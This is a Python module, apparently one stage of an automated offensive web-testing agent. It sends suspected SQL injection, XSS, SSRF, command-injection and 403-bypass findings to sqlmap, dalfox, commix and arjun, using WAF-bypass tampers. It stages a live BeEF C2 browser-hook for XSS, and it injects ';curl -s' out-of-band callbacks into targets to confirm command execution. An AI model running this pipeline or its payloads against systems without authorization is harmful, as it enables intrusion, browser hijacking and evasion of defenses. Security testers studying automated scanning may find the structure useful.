"""Stage 3 — Heavy-Tool Escalation & Confirmation (single `AGENT`).

Takes the hunt stage's suspected findings and confirms them with dedicated `.bin/` binaries & C2 servers:
  - Suspected SQL Injection   -> `.bin/sqlmap` (with vendor-matched tamper scripts & rotated User-Agent)
  - Suspected XSS / MitB      -> `.bin/dalfox` DOM/reflection verifier + live `BeefServer` C2 hook stager (`hook.js`)
  - Suspected SSRF / XXE      -> `OOBManager` (`.bin/interactsh-client` + local HTTP callback listener)
  - Suspected Command Inject  -> `.bin/commix` + OOB command execution canary (`curl <oob_url>`)
  - Suspected 403 Bypass      -> `scan/bypass_403.py` + `.bin/arjun` parameter discovery on unlocked endpoint
"""
import urllib.parse
from core.findings import Finding
from core.memory import set_phase
from core.telemetry import TELEMETRY
from core.waf_bypass import probe_with_mutex_bypass
from tools.adapters import run_sqlmap, run_dalfox, run_commix, run_arjun
from tools.beef import handoff_xss_to_beef
from tools.oob import get_oob_manager
from agents.agent import AGENT_BUS, AGENT_HANDLE


def escalate_finding(f: Finding, waf_vendor: str = "generic", target: str | None = None) -> Finding:
    vtype = (f.type or "").lower()
    escalations = list(f.escalated_with or [])

    # 1. Suspected SQLi -> .bin/sqlmap
    if "sql" in vtype:
        AGENT_BUS.say(
            f"Escalating suspected SQLi on `{f.url}` (`{f.parameter}`) to `.bin/sqlmap` with `{waf_vendor}` tampers.",
            kind="stage",
            stage="escalate",
            target=target,
        )
        res = run_sqlmap(f.url, param=f.parameter, waf_vendor=waf_vendor, timeout=60)
        escalations.append("sqlmap")
        if res.get("vulnerable"):
            f.sqlmap_confirmed = True
            f.severity = "critical"
            f.confidence = max(f.confidence, 0.97)
            dbms = res.get("dbms") or "SQL DBMS"
            f.evidence = f"{f.evidence} | Escalated & confirmed by `.bin/sqlmap` (DBMS={dbms}, techniques={res.get('payloads')})"

    # 2. Suspected XSS -> .bin/dalfox + live BeEF Hook Server
    elif "xss" in vtype or "mitb" in vtype:
        AGENT_BUS.say(
            f"Escalating suspected XSS on `{f.url}` (`{f.parameter}`) with `.bin/dalfox` and a live BeEF hook stager.",
            kind="stage",
            stage="escalate",
            target=target,
        )
        dx = run_dalfox(f.url, param=f.parameter, timeout=30)
        escalations.append("dalfox")
        beef = handoff_xss_to_beef(f.url, param=f.parameter, finding_id=f.id)
        escalations.append("beef_hook")
        f.beef_hook_url = beef.get("hook_url", "")
        best = beef.get("best_stager") or {}
        if best.get("verified_in_dom"):
            f.confidence = max(f.confidence, 0.95)
            f.evidence = f"{f.evidence} | BeEF C2 hook staged (`{f.beef_hook_url}`, stager={best.get('name')})"
        if dx:
            f.confidence = max(f.confidence, 0.96)
            f.evidence = f"{f.evidence} | `.bin/dalfox` confirmed PoC ({len(dx)} vector(s))"

    # 3. Suspected SSRF / XXE -> Interactsh / Local OOB Listener
    elif "ssrf" in vtype or "xxe" in vtype:
        oob = get_oob_manager()
        canary = oob.generate_canary("ssrf-escalate")
        AGENT_BUS.say(
            f"Escalating suspected SSRF on `{f.url}` (`{f.parameter}`) with OOB listener `{canary['http_url']}`.",
            kind="stage",
            stage="escalate",
            target=target,
        )
        probe_with_mutex_bypass(f.url, f.parameter, canary["http_url"], vuln_class="ssrf")
        hits = oob.poll(canary["token"], wait_s=0.45)
        escalations.append("interactsh_oob")
        if hits:
            f.oob_interactions = list(f.oob_interactions or []) + hits
            f.severity = "critical"
            f.confidence = max(f.confidence, 0.98)
            f.evidence = f"{f.evidence} | Live OOB callback received from target server (token={canary['token']})"

    # 4. Suspected Command Injection -> .bin/commix + OOB RCE callback
    elif "command" in vtype or "cmdi" in vtype:
        AGENT_BUS.say(
            f"Escalating suspected CMDi on `{f.url}` (`{f.parameter}`) via `.bin/commix` and an OOB shell beacon.",
            kind="stage",
            stage="escalate",
            target=target,
        )
        cx = run_commix(f.url, param=f.parameter, timeout=35)
        escalations.append("commix")
        oob = get_oob_manager()
        canary = oob.generate_canary("cmdi-rce")
        probe_with_mutex_bypass(f.url, f.parameter, f";curl -s {canary['http_url']}", vuln_class="cmdi")
        hits = oob.poll(canary["token"], wait_s=0.45)
        if hits:
            escalations.append("oob_rce")
            f.oob_interactions = list(f.oob_interactions or []) + hits
        if cx.get("vulnerable") or hits:
            f.severity = "critical"
            f.confidence = max(f.confidence, 0.97)
            f.evidence = f"{f.evidence} | Escalated CMDi verified (commix={cx.get('vulnerable')}, oob_hits={len(hits)})"

    # 5. Suspected 403 Bypass -> Arjun hidden param discovery behind unlocked route
    elif "403" in vtype or "bypass" in vtype:
        params = run_arjun(f.url, timeout=15)
        escalations.append("arjun_post_bypass")
        if params:
            f.evidence = f"{f.evidence} | Post-bypass `.bin/arjun` uncovered hidden params: {params}"

    f.escalated_with = list(dict.fromkeys(escalations))
    if escalations:
        TELEMETRY.record_finding("escalate", AGENT_HANDLE, f.type, f.url, detail=",".join(f.escalated_with))
    return f


def run_escalator(target: str, findings: list[Finding], waf_vendor: str = "generic") -> list[Finding]:
    parsed = urllib.parse.urlparse(target if "://" in target else f"http://{target}")
    host_label = parsed.netloc or target
    set_phase(host_label, "escalate")

    with TELEMETRY.agent_scope(AGENT_HANDLE, task=f"Stage 3/6 · Escalating {len(findings)} leads ({host_label})", target=target, tool="sqlmap/dalfox/beef", stage="escalate"):
        AGENT_BUS.stage_started(
            "escalate",
            f"confirming {len(findings)} leads with `.bin/sqlmap`, `.bin/dalfox`, BeEF, `.bin/commix` and Interactsh OOB",
            target=host_label,
        )
        out = []
        for idx, item in enumerate(findings, 1):
            TELEMETRY.set_agent_step(AGENT_HANDLE, f"[{idx}/{len(findings)}] Escalating {item.type} on {item.url[:70]}", tool=item.type)
            out.append(escalate_finding(item, waf_vendor=waf_vendor, target=host_label))
        AGENT_BUS.stage_done(
            "escalate",
            f"{len(out)} leads processed. Moving to deterministic verification.",
            target=host_label,
        )
        return out


run = run_escalator
